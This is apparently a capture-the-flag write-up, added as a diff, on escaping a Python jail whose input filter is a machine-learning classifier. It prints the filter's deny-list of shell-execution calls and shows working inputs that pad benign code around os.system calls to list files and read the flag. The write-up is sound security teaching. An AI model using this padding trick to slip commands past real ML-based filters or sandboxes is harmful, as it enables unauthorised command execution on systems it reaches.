@@ -1,0 +1,83 @@
+# ML Py jail
+
+A classic py jail using machine learning for it's filter.
+
+## Experimentation
+
+We started by having a look at the service:
+
+```
+>>> print("Hello, World!")
+Hello, World!
+
+>>> import os
+Bad Code Detected ...
+```
+
+## Code
+
+Having a quick look at the code, we realize that the filter being used is a machine learning model.
+
+Let's have a look at the training data.
+
+Extract from `\tags\good_code.txt`:
+
+```
+print('Hello, World!')
+x = 5; y = 10; print(x + y)
+numbers = [1, 2, 3, 4, 5]; print(sum(numbers))
+print(''.join(['Hello', ' ', 'World!']))
+print('The answer is', 42)
+print('Even' if x % 2 == 0 else 'Odd')
+names = ['Alice', 'Bob', 'Charlie']; print(', '.join(names))
+import math; print(math.sqrt(16))
+```
+
+Extract from `\tags\bad_code.txt`:
+
+```
+os.system("ls")
+os.popen("ls").read()
+commands.getstatusoutput("ls")
+commands.getoutput("ls")
+commands.getstatus("file/path")
+subprocess.call("ls", shell=True)
+subprocess.Popen("ls", shell=True)
+pty.spawn("ls")
+```
+
+## Attack
+
+We can convince the model that code is good by feeding it a lot of _"good"_ training data with malicious code at the end.
+
+Let's try this again:
+
+```
+>>> print('Hello, World!'); x = 5; y = 10; print(x + y); numbers = [1, 2, 3, 4, 5]; print(sum(numbers)); import os
+Hello, World!
+15
+15
+
+>>> print('Hello, World!'); x = 5; y = 10; print(x + y); numbers = [1, 2, 3, 4, 5]; print(sum(numbers)); os.system("ls")
+Dockerfile
+MLjail
+ReadME.md
+docker-compose.yml
+entrypoint.sh
+Hello, World!
+15
+15
+```
+
+This worked ! All that we need to do is read the flag
+
+```
+>>> print('Hello, World!'); x = 5; y = 10; print(x + y); numbers = [1, 2, 3, 4, 5]; print(sum(numbers)); os.system("cat MLjail/flag.txt")
+PCTF{M@chin3_1earning_d0_be_tR@nsformati0na1_1818726356}Hello, World!
+15
+15
+```
+
+## Flag
+
+`PCTF{M@chin3_1earning_d0_be_tR@nsformati0na1_1818726356}`
